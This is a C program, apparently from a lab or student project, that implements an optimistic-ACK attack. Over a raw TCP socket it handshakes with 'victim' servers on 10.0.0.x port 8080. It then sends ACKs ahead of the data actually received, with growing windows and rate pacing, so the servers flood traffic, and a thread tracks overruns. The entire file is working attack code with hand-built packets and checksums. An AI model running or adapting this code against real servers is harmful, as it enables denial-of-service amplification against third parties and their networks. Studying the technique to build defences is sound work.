#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>

//Socket stuff
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//IP header (struct iphdr) definition
#include <linux/ip.h>
//TCP header (struct tcphdr) definition
#include <linux/tcp.h>

#define MSS (1460)
#define wscale (4)
#define client_bw (1544000.0)
#define maxwindow (240000)
#define min_wait (0.00024870466321243526)

//Pseudo header needed for calculating the TCP header checksum
struct pseudoTCPPacket {
  uint32_t srcAddr;
  uint32_t dstAddr;
  uint8_t zero;
  uint8_t protocol;
  uint16_t TCP_len;
};

// All the data we need to attack a single victim
struct victim_connection {
  unsigned id;  // A unique id for each connection (for ex. 1 for 10.0.0.1)
  u_int32_t dst_addr;  // The address of the victim
  u_int16_t dst_port;  // The port of the victim
  unsigned start_ack;  // The first ack we received after the handshake
  char had_overrun;    // 0 if there was no overrun. 1 if we are overrunning
  unsigned last_received_seq; // the last received sequence from the victim
  unsigned last_sent_ack;  // the last ack that we sent
  unsigned send_seq;       // the sequence we are using to send...this shouldn't change after the handshake
  unsigned overrun_ack;    // stores the ack that was overrun
  unsigned is_done;        // if a fin packet was received, it will be 1
  unsigned short window;         // the current window size
  pthread_mutex_t lock;     // a mutex lock to sync the two threads
};

struct pace_args {
  int socket;
  unsigned num_victims;
  int duration;
  struct victim_connection *m_victims;
};

void processOverruns(unsigned seq, struct victim_connection *m_victim);

double d_max(double a, double b) {
    if (a > b)
      return a;
    return b;
}


// TODO I DONT THINK THIS IS NECESSARY
//Debug function: dump 'index' bytes beginning at 'buffer'
void hexdump(unsigned char *buffer, unsigned long index) {
  unsigned long i;
  printf("hexdump on address %p:\n", buffer);
  for (i=0;i<index;i++)
  {
    printf("%02x ",buffer[i]);
  }
  printf("\n");
}

// TODO THIS SHOULD BE VALIDATED
//Calculate the TCP header checksum of a string (as specified in rfc793)
//Function from http://www.binarytides.com/raw-sockets-c-code-on-linux/
unsigned short csum(unsigned short *ptr,int nbytes) {
  long sum;
  unsigned short oddbyte;
  short answer;

  //Debug info
  //hexdump((unsigned char *) ptr, nbytes);
  //printf("csum nbytes: %d\n", nbytes);
  //printf("csum ptr address: %p\n", ptr);

  sum=0;
  while(nbytes>1) {
    sum+=*ptr++;
    nbytes-=2;
  }
  if(nbytes==1) {
    oddbyte=0;
    *((u_char*)&oddbyte)=*(u_char*)ptr;
    sum+=oddbyte;
  }

  sum = (sum>>16)+(sum & 0xffff);
  sum += (sum>>16);
  answer=(short)~sum;

  return(answer);
}

int send_packet(int socket,
                struct victim_connection *m_connection,
                unsigned seq_nbr,
                unsigned ack_nbr,
                void* content,
                unsigned content_length,
                char syn,
                char fin,
                char rst,
                char is_ack,
                unsigned short window,
                int w_scale) {
    // TODO implement send packet to construct the packet and send
    // it based to the provided socket

    int bytes_sent;
    struct tcphdr *tcpHdr;

    //TCP header + data
    char packet[MSS];
    int packet_length;

    //Address struct to sendto()
    struct sockaddr_in addr_in;

    //Pseudo TCP header to calculate the TCP header's checksum
    struct pseudoTCPPacket pTCPPacket;

    //Pseudo TCP Header + TCP Header + data
    char *pseudo_packet;
    unsigned *tcpopt;
    char *data;
    //Populate address struct
    addr_in.sin_family = AF_INET;
    addr_in.sin_port = htons(m_connection->dst_port);
    addr_in.sin_addr.s_addr = m_connection->dst_addr;

    //Allocate mem for tcp headers and 0
    memset(packet, 0, MSS);
    tcpHdr = (struct tcphdr *) packet;
    if (syn) {
      tcpopt = (unsigned *) (packet + sizeof(struct tcphdr));
      data = (char *) (packet + sizeof(struct tcphdr) + 4);

      packet_length = sizeof(struct tcphdr) + content_length + 4;
      // set the wscale option
      unsigned tcp_wscale_kind = 3;
      unsigned tcp_wscale_len = 3;
      unsigned tcp_wscale_shift = wscale;

      unsigned w_scaleopt = ((tcp_wscale_kind << 24) +
                   (tcp_wscale_len << 16) +
                   (tcp_wscale_shift << 8));

      *tcpopt = htonl(w_scaleopt);

      tcpHdr->doff = 6;
    } else {
      packet_length = sizeof(struct tcphdr) + content_length;
      data = (char *) (packet + sizeof(struct tcphdr));
      tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
    }

    memcpy(data, content, content_length);

    //Populate tcpHdr
    // TODO WHAT IS THE SOURCE PORT
    tcpHdr->source = htons(6); //16 bit in nbp format of source port
    tcpHdr->dest = htons(m_connection->dst_port); //16 bit in nbp format of destination port
    tcpHdr->seq = htonl(seq_nbr); //32 bit sequence number, initially set to zero

    if (is_ack) {
      tcpHdr-> ack = 1;
      //printf("Sending an ack: %u\n", ack_nbr);
      tcpHdr->ack_seq = htonl((unsigned)ack_nbr); //32 bit ack sequence number, depends whether ACK is set or not

    } else {
      //printf("Not sending an ack %u\n", ack_nbr);
      tcpHdr->ack = 0;
      tcpHdr->ack_seq = 0;
    }

    tcpHdr->res1 = 0; //4 bits: Not used
    tcpHdr->cwr = 0; //Congestion control mechanism
    tcpHdr->ece = 0; //Congestion control mechanism
    tcpHdr->urg = 0; //Urgent flag
    tcpHdr->psh = 0; //Push data immediately
    tcpHdr->rst = rst; //RST flag
    tcpHdr->syn = syn; //SYN flag
    tcpHdr->fin = fin; //Terminates the connection
    tcpHdr->window = window;//0xFFFF; //16 bit max number of databytes
    tcpHdr->check = 0; //16 bit check sum. Can't calculate at this point
    tcpHdr->urg_ptr = 0; //16 bit indicate the urgent data. Only if URG flag is set

  //Now we can calculate the checksum for the TCP header
  // TODO WHAT IS THE SRC ADDR??
  pTCPPacket.srcAddr = inet_addr("10.0.0.1"); //32 bit format of source address
  pTCPPacket.dstAddr = m_connection->dst_addr; //32 bit format of source address
  pTCPPacket.zero = 0; //8 bit always zero
  pTCPPacket.protocol = IPPROTO_TCP; //8 bit TCP protocol
  pTCPPacket.TCP_len = htons(packet_length); // 16 bit length of TCP header

  //Populate the pseudo packet
  pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + packet_length));
  memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + packet_length);

  //Copy pseudo header
  memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));

  //Calculate check sum: zero current check, copy TCP header + data to pseudo TCP packet, update check
  tcpHdr->check = 0;

  //Copy tcp header + data to fake TCP header for checksum
  memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, packet_length);

  //Set the TCP header's check field
  tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) + packet_length)));

  //printf("TCP Checksum: %d\n", (int) tcpHdr->check);

  //Finally, send packet
  if((bytes_sent = sendto(socket, packet, packet_length, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {
    perror("Error on sendto()");
  }
  else {
    //printf("Success! Sent %d bytes.\n", bytes_sent);
  }


}
unsigned getIndex(u_int32_t ip) {
  unsigned index;
  index = ip>>24;
  return index;
}
/* TODO This will take 3 arguments. The list of all the connections
 * the socket, and the victim to return on.
 * If any packets arrive that do not belong to the current host,
 * it will check for an overrun
 */
unsigned read_packet(struct victim_connection *m_victim,
                     int sock,
                     struct victim_connection *m_victims,
                     unsigned num_victims) {

    // TODO keep reading the socket for a relevent ip
    // update the sequence number

    while (1) {
      char buff[65535];
      if (recvfrom(sock, buff, 65535, 0, NULL, NULL) < 0) {
        perror("Error on recv()");
      } else {
        // find out who sent this packet
        struct sockaddr_in source_socket_address, dest_socket_address;
        struct iphdr *ip_packet = (struct iphdr *) buff;
        memset(&source_socket_address, 0, sizeof(source_socket_address));
        source_socket_address.sin_addr.s_addr = ip_packet->saddr;
        memset(&dest_socket_address, 0, sizeof(dest_socket_address));
        dest_socket_address.sin_addr.s_addr = ip_packet->daddr;

        if (source_socket_address.sin_addr.s_addr == m_victim->dst_addr) {

          unsigned short iphdrlen;
          iphdrlen = ip_packet->ihl*4;

          struct tcphdr *tcph = (struct tcphdr*)(buff + iphdrlen);

          //printf("Incoming packet: \n");
          //printf("Packet size (bytes) %d\n", ntohs(ip_packet->tot_len));
          //printf("Source Address: %s\n", (char *)inet_ntoa(source_socket_address.sin_addr));
          //printf("Destination Address: %s\n", (char *)inet_ntoa(dest_socket_address.sin_addr));
          //printf("Identification: %d\n\n", ntohs(ip_packet->id));


          // Return the sequence number for the received packet
          return ntohl(tcph->seq);
        } else {
          //printf("Does not match\n");
          int i = getIndex(source_socket_address.sin_addr.s_addr) - 2;
          if (i >= 0 && i < num_victims) {
            if(source_socket_address.sin_addr.s_addr == m_victims[i].dst_addr) {
              unsigned short iphdrlen;
              iphdrlen = ip_packet->ihl*4;

              struct tcphdr *tcph = (struct tcphdr*)(buff + iphdrlen);

              processOverruns(ntohl(tcph->seq), &(m_victims[i]));
            }
          }
        }
      }
    }

}

void handshake(struct victim_connection *m_victim,
               int sock,
               struct victim_connection *m_victims,
               unsigned victims) {

    unsigned send_seq = 256; //TODO random
    long ack_nbr=-1;
    void* content = "";
    unsigned content_length = 0;
    char syn = 0;
    char fin = 0;
    char rst = 0;
    unsigned short window = 5840;
    int w_scale = 0;
    send_packet(sock,m_victim,send_seq,ack_nbr,
                content,content_length,1,fin,rst,0,
                MSS,w_scale);
    unsigned read_seq = read_packet(m_victim, sock, m_victims, victims);
  //printf("Received packet with sequence num: %u\n", read_seq);
    send_seq +=1;
    ack_nbr = 0;
    ack_nbr = (long)read_seq+1;
    send_packet(sock,m_victim,send_seq,ack_nbr,
                content,content_length,syn,fin,rst,1,
                window,w_scale);
    content = "GET / HTTP/1.0\r\n\r\n";
    content_length = strlen(content);
    send_packet(sock,m_victim,send_seq,ack_nbr,
    content,content_length,syn,fin,rst,1,
    window,w_scale);
    m_victim->send_seq = send_seq + content_length;

}
void processOverruns(unsigned seq, struct victim_connection *m_victim)
{
  //printf("Received packet in check overruns\n");
  pthread_mutex_lock(&(m_victim->lock));
  if (seq == m_victim->last_received_seq) {
    //printf("This is an overrun\n");
    m_victim->had_overrun = 1;
    m_victim->overrun_ack = seq;
  } else if (seq > m_victim->last_received_seq) {
    //printf("There is no overrun\n");
    m_victim->last_received_seq = seq;
  }
  pthread_mutex_unlock(&(m_victim->lock));
}

/**
 *  This method is used by the listening thread to receive packets
 */
void *checkOverruns(void *vargp) {

    struct pace_args *m_args = (struct pace_args*) vargp;
    int i;
    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    gettimeofday(&current_time, NULL);

    while (current_time.tv_sec - start_time.tv_sec <= m_args->duration) {

      for (i = 0; i < m_args->num_victims && current_time.tv_sec - start_time.tv_sec <= m_args->duration; i++) {

        //printf("Waiting to receive packet from host %d\n", i);
        unsigned read_seq = read_packet(&(m_args->m_victims[i]),
                                          m_args->socket,
                                          m_args->m_victims,
                                          m_args->num_victims);

        processOverruns(read_seq, &(m_args->m_victims[i]));

        gettimeofday(&current_time, NULL);

      }

    }
}

int beginAttack(int duration, double target_rate, int num_victims) {

    printf("Beginning with %d victims. Please wait 30 seconds.\n", num_victims);

    // local variables
    int sock, i;
    // TODO Implement
    struct victim_connection m_victims[num_victims];
    double curr_rate = target_rate / 10;

    // Open the socket
    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
      perror("Error while creating socket");
      exit(-1);
    }

    // Set up each connection struct
    for(i = 0; i < num_victims; i++) {
      char victAddr[20];
      sprintf(victAddr, "10.0.0.%d", i + 2);

      m_victims[i].id = i + 2;
      m_victims[i].dst_addr = inet_addr(victAddr);
      m_victims[i].dst_port = 8080;//TODO;
      m_victims[i].window = MSS;
      m_victims[i].had_overrun = 0;
      m_victims[i].overrun_ack = 0;
      m_victims[i].is_done = 0;
      if (pthread_mutex_init(&(m_victims[i].lock), NULL) != 0) {
        printf("\nFailed to create mutex lock");
        return 1;
      }
    }

    // TODO FOR MULTI CONNECTION DO THE NEXT 3 LINES TOGETHER FOR EACH
    // VICTIM
    // Connect to each server using 3-way handshake
    for(i = 0; i < num_victims; i++){

        handshake(&m_victims[i], sock, m_victims, num_victims);
        // Get the start ack for each connection
        unsigned read_seq = read_packet(&(m_victims[i]),
                                        sock,
                                        m_victims,
                                        num_victims);


        m_victims[i]    .start_ack
          = m_victims[i].last_received_seq
          = m_victims[i].last_sent_ack
          = read_seq;
    }

    pthread_t tid;
    struct pace_args p_args;
    p_args.socket = sock;
    p_args.num_victims = num_victims;
    p_args.duration = duration;
    p_args.m_victims = m_victims;

    pthread_create(&tid, NULL, checkOverruns, (void *) &p_args);

    // begin the real attack

    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    gettimeofday(&current_time, NULL);

    while (current_time.tv_sec - start_time.tv_sec <= duration) {
      // See if the attack should stop

      for (i = 0; i < num_victims; i++) {
        struct victim_connection *currConnection = &(m_victims[i]);
        pthread_mutex_lock(&(currConnection->lock));
        if (currConnection->had_overrun) {
          //printf("Resetting last sent ack\n");
          currConnection->last_sent_ack = currConnection->overrun_ack;
          currConnection->had_overrun = 0;
        }
        pthread_mutex_unlock(&(currConnection->lock));

        struct timeval before_sent, after_sent;
        gettimeofday(&before_sent, NULL);

        // Go through each connection and send the next ack

        send_packet(sock,                       // socket
                    currConnection,             // connection
                    currConnection->send_seq,          // sequence number
                    currConnection->last_sent_ack,     // ack number
                    "",                         // content
                    0,                          // content length
                    0,                          // syn
                    0,                          // fin
                    0,                          // rst
                    1,                          // is_ack
                    5840,                       // window
                    0);                         // w_scale

        gettimeofday(&after_sent, NULL);

        // for each connection increment the ack by the window size
        currConnection->last_sent_ack += currConnection->window;

        // TODO go to sleep for the right amount of time
        double elapsed_seconds = (after_sent.tv_sec - before_sent.tv_sec) +
                          1.0e-6 * (after_sent.tv_usec - before_sent.tv_usec);

        double secsToWait = d_max(min_wait,
                            currConnection->window / (curr_rate * num_victims));

        secsToWait -= elapsed_seconds;

        if (secsToWait > 0) {
            struct timespec rgtp;
            double nanoToWait = secsToWait * 1E9;
            rgtp.tv_sec = 0;
            rgtp.tv_nsec = nanoToWait;
            nanosleep(&rgtp, NULL);
        }

        // increase the window size by mss as long as its less than the max
        if (currConnection->window < maxwindow) {
            currConnection->window += MSS;
        }
      }

      if (curr_rate < target_rate) {
          curr_rate += target_rate / 100;
      }

      gettimeofday(&current_time, NULL);
    }


    // Cleanup send the fin packet since we cannot call RST
    // TODO THIS PROBABLY ISN'T NEEDED
    for (i = 0; i < num_victims; i++) {

      send_packet(sock,                         // socket
                  &m_victims[i],                    // connection
                  m_victims[i].send_seq,            // sequence number
                  0,                            // ack number
                  "",                           // content
                  0,                            // content length
                  0,                            // syn
                  1,                            // fin
                  0,                            // rst
                  0,                            // is_ack
                  5840,                         // window
                  0);                           // w_scale

    }
    //printf("Waiting to join\n");
    pthread_join(tid, NULL);

    //printf("Joined with other thread\n");
    for (i = 0; i < num_victims; i++ ) {
      pthread_mutex_destroy(&(m_victims[i].lock));
    }

    close(sock);
    printf("Completed\n");
}



int main(int argc, char const *argv[]) {
  //printf("In Main: About to begin:");
  // TODO, more arguments will be provided as the ip and ports of victims

  int num_victims = atoi(argv[1]);
  int target_rate = atoi(argv[2]);
  beginAttack(30, target_rate, num_victims);

  return 0;
}
